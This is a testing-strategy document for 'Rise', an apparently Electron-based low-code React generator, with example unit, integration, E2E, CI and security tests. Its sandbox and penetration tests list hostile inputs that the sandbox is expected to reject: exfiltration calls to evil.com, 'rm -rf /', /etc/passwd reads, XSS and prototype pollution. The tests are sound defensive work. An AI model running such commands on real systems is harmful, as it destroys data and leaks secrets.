# Testing Strategy

> Comprehensive testing approach for Rise - ensuring reliability, security, and code quality from MVP to production.

## Philosophy

Rise has a unique testing challenge: we generate code that must be **correct, secure, and performant**. A bug in our code generator could affect hundreds of users' projects.

**Core Testing Principles**:
1. **Test the Generator, Not Just the Output**: Validate the engine that creates code
2. **Security is Non-Negotiable**: Every security feature must have tests
3. **Generated Code Must Be Tested**: User projects should work out of the box
4. **Fast Feedback Loops**: Tests run in < 5 minutes locally
5. **Confidence to Ship**: 80%+ coverage on core systems

---

## Testing Pyramid

```
           /\
          /  \    E2E Tests (10%)
         /────\   Critical user workflows
        /      \  
       /────────\ Integration Tests (30%)
      /          \ Component → Generation → Preview
     /────────────\
    /              \ Unit Tests (60%)
   /────────────────\ Manifest, Generator, Parser
  /──────────────────\
```

**Distribution**:
- **60% Unit Tests**: Fast, focused, high coverage
- **30% Integration Tests**: Key workflows end-to-end  
- **10% E2E Tests**: Critical paths in actual Electron app

---

## Test Infrastructure

### Tools & Frameworks

```json
{
  "devDependencies": {
    "vitest": "^1.0.0",           // Unit + Integration testing
    "playwright": "^1.40.0",      // E2E testing
    "@testing-library/react": "^14.0.0",
    "@testing-library/jest-dom": "^6.0.0",
    "@testing-library/user-event": "^14.0.0",
    "msw": "^2.0.0",              // API mocking
    "c8": "^8.0.0"                // Coverage
  }
}
```

### Project Structure

```
tests/
├── unit/                      # Unit tests
│   ├── manifest/
│   │   ├── manager.test.ts
│   │   ├── validator.test.ts
│   │   └── schema.test.ts
│   ├── generator/
│   │   ├── react-generator.test.ts
│   │   ├── imports.test.ts
│   │   └── optimization.test.ts
│   ├── parser/
│   │   ├── expression-parser.test.ts
│   │   ├── component-parser.test.ts
│   │   └── ast-validator.test.ts
│   └── security/
│       ├── sandbox.test.ts
│       ├── plugin-security.test.ts
│       └── input-sanitizer.test.ts
│
├── integration/              # Integration tests
│   ├── workflows/
│   │   ├── create-project.test.ts
│   │   ├── add-component.test.ts
│   │   └── generate-preview.test.ts
│   ├── plugins/
│   │   ├── react-plugin.test.ts
│   │   └── vue-plugin.test.ts
│   └── ai/
│       └── claude-integration.test.ts
│
├── e2e/                      # End-to-end tests
│   ├── user-flows/
│   │   ├── first-project.spec.ts
│   │   ├── component-editing.spec.ts
│   │   └── preview-debug.spec.ts
│   └── fixtures/
│       └── sample-projects/
│
├── security/                 # Security-specific tests
│   ├── penetration/
│   │   ├── expression-injection.test.ts
│   │   ├── plugin-escape.test.ts
│   │   └── api-key-extraction.test.ts
│   └── audit/
│       └── dependency-scan.test.ts
│
└── generated-code/          # Tests for generated projects
    ├── build.test.ts
    ├── runtime.test.ts
    └── eslint.test.ts
```

---

## Unit Testing (60% of tests)

### Coverage Targets

| Component | Target Coverage | Priority |
|-----------|----------------|----------|
| Manifest Manager | 90% | Critical |
| Code Generator | 85% | Critical |
| Expression Parser | 95% | Critical |
| Security Sandbox | 100% | Critical |
| Plugin System | 80% | High |
| UI Components | 70% | Medium |
| File Watcher | 85% | High |

### Example: Manifest Manager Tests

```typescript
// tests/unit/manifest/manager.test.ts
import { describe, it, expect, beforeEach, vi } from 'vitest';
import { ManifestManager } from '@/engine/manifest/manager';
import { ComponentSchema } from '@/shared/types';

describe('ManifestManager', () => {
  let manager: ManifestManager;

  beforeEach(() => {
    manager = new ManifestManager();
  });

  describe('Component Operations', () => {
    it('should add a component to manifest', () => {
      const component: ComponentSchema = {
        id: 'comp_001',
        displayName: 'Button',
        type: 'PrimitiveComponent',
        properties: {},
      };

      manager.addComponent(component);

      const result = manager.getComponent('comp_001');
      expect(result).toEqual(component);
    });

    it('should reject component with duplicate ID', () => {
      const component: ComponentSchema = {
        id: 'comp_001',
        displayName: 'Button',
        type: 'PrimitiveComponent',
        properties: {},
      };

      manager.addComponent(component);

      expect(() => {
        manager.addComponent(component);
      }).toThrow('Component with ID comp_001 already exists');
    });

    it('should update component properties', () => {
      const component: ComponentSchema = {
        id: 'comp_001',
        displayName: 'Button',
        type: 'PrimitiveComponent',
        properties: {
          label: { type: 'static', value: 'Old Label' },
        },
      };

      manager.addComponent(component);
      
      manager.updateComponent('comp_001', {
        properties: {
          label: { type: 'static', value: 'New Label' },
        },
      });

      const updated = manager.getComponent('comp_001');
      expect(updated.properties.label.value).toBe('New Label');
    });

    it('should remove component and its children', () => {
      const parent: ComponentSchema = {
        id: 'comp_001',
        displayName: 'Parent',
        type: 'CompositeComponent',
        children: ['comp_002'],
        properties: {},
      };

      const child: ComponentSchema = {
        id: 'comp_002',
        displayName: 'Child',
        type: 'PrimitiveComponent',
        properties: {},
      };

      manager.addComponent(parent);
      manager.addComponent(child);
      
      manager.removeComponent('comp_001');

      expect(manager.getComponent('comp_001')).toBeNull();
      expect(manager.getComponent('comp_002')).toBeNull();
    });
  });

  describe('Validation', () => {
    it('should validate component schema', () => {
      const invalidComponent = {
        id: 'comp_001',
        displayName: 'Button',
        // Missing 'type' field
        properties: {},
      };

      const result = manager.validateComponent(invalidComponent);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContainEqual(
        expect.objectContaining({
          field: 'type',
          message: expect.stringContaining('required'),
        })
      );
    });

    it('should validate circular references', () => {
      const comp1: ComponentSchema = {
        id: 'comp_001',
        displayName: 'Component1',
        type: 'CompositeComponent',
        children: ['comp_002'],
        properties: {},
      };

      const comp2: ComponentSchema = {
        id: 'comp_002',
        displayName: 'Component2',
        type: 'CompositeComponent',
        children: ['comp_001'], // Circular!
        properties: {},
      };

      manager.addComponent(comp1);

      expect(() => {
        manager.addComponent(comp2);
      }).toThrow('Circular reference detected');
    });
  });

  describe('Serialization', () => {
    it('should save manifest to JSON', async () => {
      const component: ComponentSchema = {
        id: 'comp_001',
        displayName: 'Button',
        type: 'PrimitiveComponent',
        properties: {},
      };

      manager.addComponent(component);

      const json = await manager.toJSON();
      const parsed = JSON.parse(json);

      expect(parsed.components).toHaveProperty('comp_001');
      expect(parsed.schemaVersion).toBe('1.0.0');
    });

    it('should load manifest from JSON', async () => {
      const json = JSON.stringify({
        schemaVersion: '1.0.0',
        components: {
          comp_001: {
            id: 'comp_001',
            displayName: 'Button',
            type: 'PrimitiveComponent',
            properties: {},
          },
        },
      });

      await manager.fromJSON(json);

      const component = manager.getComponent('comp_001');
      expect(component).toBeDefined();
      expect(component.displayName).toBe('Button');
    });
  });
});
```

### Example: Code Generator Tests

```typescript
// tests/unit/generator/react-generator.test.ts
import { describe, it, expect } from 'vitest';
import { ReactGenerator } from '@/engine/generator/react';
import { ComponentSchema } from '@/shared/types';

describe('ReactGenerator', () => {
  const generator = new ReactGenerator();

  describe('Basic Component Generation', () => {
    it('should generate simple component with props', () => {
      const schema: ComponentSchema = {
        id: 'comp_001',
        displayName: 'Button',
        type: 'PrimitiveComponent',
        properties: {
          label: {
            type: 'prop',
            dataType: 'string',
            required: true,
          },
          disabled: {
            type: 'prop',
            dataType: 'boolean',
            default: false,
          },
        },
      };

      const code = generator.generateComponent(schema);

      expect(code).toContain('export function Button');
      expect(code).toContain('{ label, disabled = false }');
      expect(code).toContain('@rise:generated');
    });

    it('should generate component with static properties', () => {
      const schema: ComponentSchema = {
        id: 'comp_001',
        displayName: 'Header',
        type: 'PrimitiveComponent',
        properties: {
          title: {
            type: 'static',
            value: 'Welcome',
          },
        },
      };

      const code = generator.generateComponent(schema);

      expect(code).toContain('Welcome');
    });
  });

  describe('Import Generation', () => {
    it('should generate imports for child components', () => {
      const schema: ComponentSchema = {
        id: 'comp_001',
        displayName: 'Card',
        type: 'CompositeComponent',
        children: ['comp_header_001', 'comp_body_001'],
        properties: {},
      };

      const code = generator.generateComponent(schema, {
        childComponents: [
          { id: 'comp_header_001', displayName: 'Header' },
          { id: 'comp_body_001', displayName: 'Body' },
        ],
      });

      expect(code).toContain("import Header from './Header'");
      expect(code).toContain("import Body from './Body'");
    });

    it('should not duplicate imports', () => {
      const schema: ComponentSchema = {
        id: 'comp_001',
        displayName: 'Parent',
        type: 'CompositeComponent',
        children: ['comp_child_001', 'comp_child_001'], // Duplicate
        properties: {},
      };

      const code = generator.generateComponent(schema, {
        childComponents: [
          { id: 'comp_child_001', displayName: 'Child' },
        ],
      });

      const importCount = (code.match(/import Child from/g) || []).length;
      expect(importCount).toBe(1);
    });
  });

  describe('Code Quality', () => {
    it('should generate code that passes ESLint', async () => {
      const schema: ComponentSchema = {
        id: 'comp_001',
        displayName: 'Button',
        type: 'PrimitiveComponent',
        properties: {
          label: { type: 'prop', dataType: 'string' },
        },
      };

      const code = generator.generateComponent(schema);

      const { ESLint } = await import('eslint');
      const eslint = new ESLint();
      const results = await eslint.lintText(code);

      expect(results[0].errorCount).toBe(0);
    });

    it('should generate formatted code (Prettier)', async () => {
      const schema: ComponentSchema = {
        id: 'comp_001',
        displayName: 'Button',
        type: 'PrimitiveComponent',
        properties: {},
      };

      const code = generator.generateComponent(schema);

      const prettier = await import('prettier');
      const formatted = await prettier.format(code, {
        parser: 'typescript',
      });

      // Code should already be formatted
      expect(code).toBe(formatted);
    });
  });
});
```

### Example: Security Tests

```typescript
// tests/unit/security/sandbox.test.ts
import { describe, it, expect } from 'vitest';
import { ExpressionSandbox } from '@/engine/security/sandbox';

describe('ExpressionSandbox', () => {
  const sandbox = new ExpressionSandbox();

  describe('Safe Expressions', () => {
    it('should execute simple math', async () => {
      const result = await sandbox.execute('2 + 2', {});
      expect(result).toBe(4);
    });

    it('should access provided context', async () => {
      const context = {
        props: { name: 'John' },
        state: { count: 5 },
      };

      const result = await sandbox.execute(
        'props.name + " " + state.count',
        context
      );

      expect(result).toBe('John 5');
    });

    it('should allow Math operations', async () => {
      const result = await sandbox.execute('Math.round(3.7)', {});
      expect(result).toBe(4);
    });

    it('should allow Date operations', async () => {
      const result = await sandbox.execute(
        'new Date("2025-10-25").getFullYear()',
        {}
      );
      expect(result).toBe(2025);
    });
  });

  describe('Blocked Operations', () => {
    it('should block eval()', async () => {
      await expect(
        sandbox.execute('eval("alert(1)")', {})
      ).rejects.toThrow('eval is not allowed');
    });

    it('should block Function constructor', async () => {
      await expect(
        sandbox.execute('new Function("return 1")()', {})
      ).rejects.toThrow('Function constructor is not allowed');
    });

    it('should block setTimeout', async () => {
      await expect(
        sandbox.execute('setTimeout(() => {}, 100)', {})
      ).rejects.toThrow('setTimeout is not allowed');
    });

    it('should block fetch', async () => {
      await expect(
        sandbox.execute('fetch("https://evil.com")', {})
      ).rejects.toThrow('fetch is not allowed');
    });

    it('should block __proto__ access', async () => {
      await expect(
        sandbox.execute('({}).__proto__.polluted = true', {})
      ).rejects.toThrow('__proto__ is not allowed');
    });

    it('should block prototype manipulation', async () => {
      await expect(
        sandbox.execute('Array.prototype.push = null', {})
      ).rejects.toThrow('prototype modification is not allowed');
    });
  });

  describe('Resource Limits', () => {
    it('should timeout long-running expressions', async () => {
      await expect(
        sandbox.execute('while(true) {}', {})
      ).rejects.toThrow('Expression timeout');
    });

    it('should limit memory usage', async () => {
      await expect(
        sandbox.execute('new Array(1000000000).fill(1)', {})
      ).rejects.toThrow(/memory/i);
    });
  });

  describe('Error Handling', () => {
    it('should handle syntax errors gracefully', async () => {
      await expect(
        sandbox.execute('props.name +', {})
      ).rejects.toThrow(/syntax/i);
    });

    it('should handle runtime errors', async () => {
      await expect(
        sandbox.execute('props.user.name', { props: {} })
      ).rejects.toThrow(/undefined/i);
    });
  });
});
```

---

## Integration Testing (30% of tests)

### Critical Workflows to Test

1. **Create Project Workflow**
2. **Add Component Workflow**
3. **Generate & Preview Workflow**
4. **AI Component Generation Workflow**
5. **Plugin Loading Workflow**

### Example: Create Project Integration Test

```typescript
// tests/integration/workflows/create-project.test.ts
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { ProjectManager } from '@/engine/project/manager';
import { ManifestManager } from '@/engine/manifest/manager';
import { CodeGenerator } from '@/engine/generator/generator';
import fs from 'fs-extra';
import path from 'path';

describe('Create Project Workflow', () => {
  let testDir: string;
  let projectManager: ProjectManager;

  beforeEach(async () => {
    testDir = path.join(__dirname, '../../.tmp', `test-${Date.now()}`);
    await fs.ensureDir(testDir);
    projectManager = new ProjectManager();
  });

  afterEach(async () => {
    await fs.remove(testDir);
  });

  it('should create complete React project', async () => {
    // 1. Create project
    const projectPath = path.join(testDir, 'my-app');
    
    await projectManager.createProject({
      name: 'my-app',
      framework: 'react',
      path: projectPath,
      typescript: false,
    });

    // 2. Verify project structure
    expect(await fs.pathExists(path.join(projectPath, 'package.json'))).toBe(true);
    expect(await fs.pathExists(path.join(projectPath, '.lowcode'))).toBe(true);
    expect(await fs.pathExists(path.join(projectPath, 'src'))).toBe(true);
    expect(await fs.pathExists(path.join(projectPath, 'vite.config.js'))).toBe(true);

    // 3. Verify manifest
    const manifest = await ManifestManager.load(
      path.join(projectPath, '.lowcode/manifest.json')
    );
    
    expect(manifest.metadata.framework).toBe('react');
    expect(manifest.metadata.projectName).toBe('my-app');

    // 4. Verify package.json
    const packageJson = await fs.readJson(
      path.join(projectPath, 'package.json')
    );
    
    expect(packageJson.dependencies).toHaveProperty('react');
    expect(packageJson.dependencies).toHaveProperty('react-dom');
    expect(packageJson.devDependencies).toHaveProperty('vite');

    // 5. Verify can install dependencies
    const { execSync } = require('child_process');
    execSync('npm install', { cwd: projectPath });

    expect(await fs.pathExists(
      path.join(projectPath, 'node_modules')
    )).toBe(true);

    // 6. Verify can build
    execSync('npm run build', { cwd: projectPath });

    expect(await fs.pathExists(
      path.join(projectPath, 'dist')
    )).toBe(true);
  });
});
```

### Example: Component Generation Integration Test

```typescript
// tests/integration/workflows/add-component.test.ts
import { describe, it, expect, beforeEach } from 'vitest';
import { ManifestManager } from '@/engine/manifest/manager';
import { CodeGenerator } from '@/engine/generator/generator';
import { ComponentSchema } from '@/shared/types';

describe('Add Component Integration', () => {
  let manifest: ManifestManager;
  let generator: CodeGenerator;

  beforeEach(() => {
    manifest = new ManifestManager();
    generator = new CodeGenerator();
  });

  it('should add component and generate code', async () => {
    // 1. Add component to manifest
    const component: ComponentSchema = {
      id: 'comp_button_001',
      displayName: 'Button',
      type: 'PrimitiveComponent',
      properties: {
        label: {
          type: 'prop',
          dataType: 'string',
          required: true,
        },
        onClick: {
          type: 'prop',
          dataType: 'function',
        },
      },
    };

    manifest.addComponent(component);

    // 2. Generate code
    const code = generator.generateComponent(component);

    // 3. Verify code structure
    expect(code).toContain('export function Button');
    expect(code).toContain('label');
    expect(code).toContain('onClick');

    // 4. Verify code compiles
    const { transformSync } = await import('@babel/core');
    const result = transformSync(code, {
      presets: ['@babel/preset-react'],
    });

    expect(result.code).toBeDefined();

    // 5. Verify ESLint passes
    const { ESLint } = await import('eslint');
    const eslint = new ESLint();
    const lintResults = await eslint.lintText(code);

    expect(lintResults[0].errorCount).toBe(0);
  });

  it('should handle component with children', async () => {
    // Add parent
    const parent: ComponentSchema = {
      id: 'comp_card_001',
      displayName: 'Card',
      type: 'CompositeComponent',
      children: ['comp_header_001', 'comp_body_001'],
      properties: {},
    };

    manifest.addComponent(parent);

    // Add children
    const header: ComponentSchema = {
      id: 'comp_header_001',
      displayName: 'CardHeader',
      type: 'PrimitiveComponent',
      properties: {
        title: { type: 'static', value: 'Card Title' },
      },
    };

    const body: ComponentSchema = {
      id: 'comp_body_001',
      displayName: 'CardBody',
      type: 'PrimitiveComponent',
      properties: {},
    };

    manifest.addComponent(header);
    manifest.addComponent(body);

    // Generate all code
    const parentCode = generator.generateComponent(parent, {
      manifest: manifest.toJSON(),
    });

    const headerCode = generator.generateComponent(header);
    const bodyCode = generator.generateComponent(body);

    // Verify imports
    expect(parentCode).toContain("import CardHeader from './CardHeader'");
    expect(parentCode).toContain("import CardBody from './CardBody'");

    // Verify usage
    expect(parentCode).toContain('<CardHeader');
    expect(parentCode).toContain('<CardBody');
  });
});
```

---

## E2E Testing (10% of tests)

### Critical User Journeys

1. **First-time user creates project**
2. **User adds and edits components**
3. **User previews application**
4. **User uses AI to generate component**
5. **User exports project**

### Example: Playwright E2E Test

```typescript
// tests/e2e/user-flows/first-project.spec.ts
import { test, expect } from '@playwright/test';
import { ElectronApplication, _electron as electron } from 'playwright';

test.describe('First Project Creation', () => {
  let app: ElectronApplication;

  test.beforeAll(async () => {
    app = await electron.launch({
      args: ['./dist/main/index.js'],
    });
  });

  test.afterAll(async () => {
    await app.close();
  });

  test('user creates first project', async () => {
    const window = await app.firstWindow();

    // 1. Click "New Project"
    await window.click('[data-testid="new-project-button"]');

    // 2. Fill in project details
    await window.fill('[data-testid="project-name"]', 'my-first-app');
    await window.selectOption('[data-testid="framework-select"]', 'react');
    await window.fill('[data-testid="project-path"]', '/tmp/test-project');

    // 3. Create project
    await window.click('[data-testid="create-project-submit"]');

    // 4. Wait for project to load
    await window.waitForSelector('[data-testid="component-tree"]', {
      timeout: 10000,
    });

    // 5. Verify project loaded
    const projectName = await window.textContent(
      '[data-testid="project-name-display"]'
    );
    expect(projectName).toBe('my-first-app');

    // 6. Verify default component exists
    const componentTree = await window.textContent(
      '[data-testid="component-tree"]'
    );
    expect(componentTree).toContain('App');
  });

  test('user adds component', async () => {
    const window = await app.firstWindow();

    // Assume project is already open

    // 1. Right-click in component tree
    await window.click('[data-testid="component-tree-root"]', {
      button: 'right',
    });

    // 2. Click "Add Component"
    await window.click('[data-testid="context-menu-add-component"]');

    // 3. Select component type
    await window.click('[data-testid="component-type-button"]');

    // 4. Fill in component name
    await window.fill('[data-testid="component-name-input"]', 'MyButton');

    // 5. Confirm
    await window.click('[data-testid="add-component-confirm"]');

    // 6. Verify component added
    await window.waitForSelector('[data-testid="component-MyButton"]');

    // 7. Verify code generated
    await window.click('[data-testid="code-tab"]');
    const code = await window.textContent('[data-testid="code-editor"]');
    expect(code).toContain('export function MyButton');
  });

  test('user previews app', async () => {
    const window = await app.firstWindow();

    // 1. Click Preview tab
    await window.click('[data-testid="preview-tab"]');

    // 2. Wait for preview to load
    await window.waitForSelector('[data-testid="preview-frame"]', {
      timeout: 15000,
    });

    // 3. Verify preview iframe exists
    const frame = window.frame({ name: 'preview' });
    expect(frame).toBeDefined();

    // 4. Verify app renders in preview
    const content = await frame.textContent('body');
    expect(content.length).toBeGreaterThan(0);
  });
});
```

---

## Generated Code Testing

### Automated Tests for Generated Projects

```typescript
// tests/generated-code/build.test.ts
import { describe, it, expect } from 'vitest';
import { execSync } from 'child_process';
import fs from 'fs-extra';
import path from 'path';

describe('Generated Project Build', () => {
  it('should build without errors', async () => {
    const projectPath = path.join(__dirname, '../../.tmp/test-project');

    // Generate test project
    await generateTestProject(projectPath);

    // Install dependencies
    execSync('npm install', { cwd: projectPath });

    // Build project
    const buildOutput = execSync('npm run build', {
      cwd: projectPath,
      encoding: 'utf8',
    });

    // Verify build succeeded
    expect(buildOutput).not.toContain('error');
    expect(await fs.pathExists(path.join(projectPath, 'dist'))).toBe(true);

    // Verify dist contains files
    const distFiles = await fs.readdir(path.join(projectPath, 'dist'));
    expect(distFiles.length).toBeGreaterThan(0);
  });

  it('should pass ESLint', async () => {
    const projectPath = path.join(__dirname, '../../.tmp/test-project');

    await generateTestProject(projectPath);

    const lintOutput = execSync('npm run lint', {
      cwd: projectPath,
      encoding: 'utf8',
    });

    expect(lintOutput).not.toContain('error');
  });

  it('should have no TypeScript errors (if TS enabled)', async () => {
    const projectPath = path.join(__dirname, '../../.tmp/test-project-ts');

    await generateTestProject(projectPath, { typescript: true });

    const typeCheckOutput = execSync('npm run type-check', {
      cwd: projectPath,
      encoding: 'utf8',
    });

    expect(typeCheckOutput).not.toContain('error');
  });
});
```

---

## Security Testing

### Penetration Testing Suite

```typescript
// tests/security/penetration/expression-injection.test.ts
import { describe, it, expect } from 'vitest';
import { ExpressionSandbox } from '@/engine/security/sandbox';

describe('Expression Injection Attacks', () => {
  const sandbox = new ExpressionSandbox();

  it('should block XSS attempts', async () => {
    const attacks = [
      '<script>alert("XSS")</script>',
      'javascript:alert(1)',
      'onload="alert(1)"',
      '"><script>alert(1)</script>',
    ];

    for (const attack of attacks) {
      await expect(
        sandbox.execute(attack, {})
      ).rejects.toThrow();
    }
  });

  it('should block prototype pollution', async () => {
    const attacks = [
      '({}).__proto__.polluted = true',
      'Object.prototype.polluted = true',
      'constructor.prototype.polluted = true',
    ];

    for (const attack of attacks) {
      await expect(
        sandbox.execute(attack, {})
      ).rejects.toThrow();
    }

    // Verify not polluted
    expect(({} as any).polluted).toBeUndefined();
  });

  it('should block code execution attempts', async () => {
    const attacks = [
      'eval("alert(1)")',
      'Function("alert(1)")()',
      'setTimeout("alert(1)", 0)',
      'new Function("return this")()',
    ];

    for (const attack of attacks) {
      await expect(
        sandbox.execute(attack, {})
      ).rejects.toThrow();
    }
  });

  it('should block file system access', async () => {
    const attacks = [
      'require("fs").readFileSync("/etc/passwd")',
      'process.exit()',
      'require("child_process").exec("rm -rf /")',
    ];

    for (const attack of attacks) {
      await expect(
        sandbox.execute(attack, {})
      ).rejects.toThrow();
    }
  });

  it('should block network access', async () => {
    const attacks = [
      'fetch("https://evil.com/steal?data=secret")',
      'new XMLHttpRequest()',
      'new WebSocket("ws://evil.com")',
    ];

    for (const attack of attacks) {
      await expect(
        sandbox.execute(attack, {})
      ).rejects.toThrow();
    }
  });
});
```

---

## CI/CD Integration

### GitHub Actions Workflow

```yaml
# .github/workflows/test.yml
name: Test Suite

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main, develop]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
          cache: 'npm'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run unit tests
        run: npm run test:unit
      
      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          files: ./coverage/coverage-final.json

  integration-tests:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run integration tests
        run: npm run test:integration

  e2e-tests:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Install Playwright
        run: npx playwright install --with-deps
      
      - name: Build app
        run: npm run build
      
      - name: Run E2E tests
        run: npm run test:e2e
      
      - name: Upload test results
        if: always()
        uses: actions/upload-artifact@v3
        with:
          name: playwright-report
          path: playwright-report/

  security-tests:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run security tests
        run: npm run test:security
      
      - name: Run npm audit
        run: npm audit --audit-level=moderate
```

---

## Test Execution Strategy

### Local Development

```bash
# Fast feedback loop (< 30 seconds)
npm run test:watch        # Unit tests only, watch mode

# Pre-commit (< 2 minutes)
npm run test:quick        # Unit + critical integration

# Pre-push (< 5 minutes)
npm run test              # All tests except E2E

# Full suite (< 15 minutes)
npm run test:all          # Everything including E2E
```

### CI/CD

- **Pull Request**: Unit + Integration tests (5 min)
- **Merge to develop**: Full suite except E2E (10 min)
- **Release candidate**: Full suite including E2E (15 min)

---

## Test Data Management

### Fixtures

```typescript
// tests/fixtures/schemas.ts
export const SAMPLE_BUTTON: ComponentSchema = {
  id: 'comp_button_001',
  displayName: 'Button',
  type: 'PrimitiveComponent',
  properties: {
    label: { type: 'prop', dataType: 'string', required: true },
    disabled: { type: 'prop', dataType: 'boolean', default: false },
  },
};

export const SAMPLE_CARD: ComponentSchema = {
  id: 'comp_card_001',
  displayName: 'Card',
  type: 'CompositeComponent',
  children: ['comp_header_001', 'comp_body_001'],
  properties: {},
};

export const SAMPLE_MANIFEST = {
  schemaVersion: '1.0.0',
  level: 1,
  metadata: {
    projectName: 'Test Project',
    framework: 'react',
  },
  components: {
    comp_button_001: SAMPLE_BUTTON,
    comp_card_001: SAMPLE_CARD,
  },
};
```

---

## Coverage Reporting

### Configuration

```typescript
// vitest.config.ts
import { defineConfig } from 'vitest/config';

export default defineConfig({
  test: {
    coverage: {
      provider: 'c8',
      reporter: ['text', 'json', 'html', 'lcov'],
      exclude: [
        'node_modules/',
        'tests/',
        '**/*.test.ts',
        '**/*.spec.ts',
        '**/types.ts',
      ],
      statements: 80,
      branches: 75,
      functions: 80,
      lines: 80,
    },
  },
});
```

### Coverage Reports

Generate and view coverage:

```bash
npm run test:coverage
open coverage/index.html
```

**Fail build if coverage drops below thresholds.**

---

## Test Maintenance

### Guidelines

1. **Keep tests fast**: Unit tests < 50ms each
2. **One assertion per test**: Focus on single behavior
3. **Clear test names**: Describe what's being tested
4. **Avoid test interdependence**: Each test independent
5. **Mock external dependencies**: Don't call real APIs
6. **Update tests with code**: Tests are documentation

### Test Smells to Avoid

❌ **Flaky tests**: Randomly pass/fail
❌ **Slow tests**: Take > 5 seconds
❌ **Brittle tests**: Break with minor changes
❌ **Obscure tests**: Hard to understand what's tested
❌ **Duplicate tests**: Testing same thing multiple ways

---

## Conclusion

This testing strategy ensures Rise delivers reliable, secure, and high-quality code generation. The multi-layered approach catches bugs at every level:

- **Unit tests**: Catch logic errors early
- **Integration tests**: Verify components work together
- **E2E tests**: Ensure user workflows function
- **Security tests**: Prevent vulnerabilities
- **Generated code tests**: Guarantee quality output

**Critical**: All tests must pass before merging to main. No exceptions.

---

**See Also**:
- [SECURITY_SPEC.md](./SECURITY_SPEC.md) - Security testing requirements
- [MVP_ROADMAP.md](./MVP_ROADMAP.md) - Testing timeline
- [COMPONENT_SCHEMA.md](./COMPONENT_SCHEMA.md) - Schema to test against

---

**Last Updated**: October 25, 2025  
**Status**: ✅ Complete - Ready for Implementation  
**Review Required**: QA Lead & Senior Developer